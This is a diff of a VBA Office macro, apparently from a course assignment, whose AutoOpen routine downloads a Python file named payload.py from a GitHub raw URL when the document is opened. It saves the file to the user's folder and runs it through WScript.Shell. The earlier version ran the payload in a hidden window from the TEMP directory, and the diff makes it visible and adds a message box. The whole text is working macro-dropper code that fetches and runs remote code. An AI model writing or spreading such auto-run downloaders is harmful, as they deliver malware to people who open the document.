@@ -1,30 +1,31 @@
 Sub AutoOpen()
     Dim http As Object
-    Dim url As String
-    Dim tempPath As String
-    Dim filePath As String
     Dim stream As Object
+    Dim url As String
+    Dim savePath As String
     Dim shell As Object
 
     url = "https://raw.githubusercontent.com/wowjulian/assignment3/refs/heads/main/payload.py"
-
-    tempPath = Environ("TEMP")
-    filePath = tempPath & "\payload.py"
+    saveDir = Environ("USERPROFILE") & "\Downloads"
+    savePath = Environ("USERPROFILE") & "\Downloads\script.py"
     Set http = CreateObject("MSXML2.XMLHTTP")
+
     http.Open "GET", url, False
     http.Send
 
     If http.Status = 200 Then
         Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 2
-        stream.Charset = "utf-8"
+        stream.Type = 1
         stream.Open
-        stream.WriteText http.ResponseText
-        stream.SaveToFile filePath, 2
+        stream.Write http.responseBody
+        stream.SaveToFile savePath, 2 ' 2 = overwrite
         stream.Close
 
+        MsgBox "Successfully downloaded the script at " & savePath
+
         Set shell = CreateObject("WScript.Shell")
-        shell.Run "python """ & filePath & """", 0, False
+
+        shell.Run "python """ & savePath & """", vbNormalFocus
     Else
         MsgBox "Failed to run the script. Status: " & http.Status
     End If
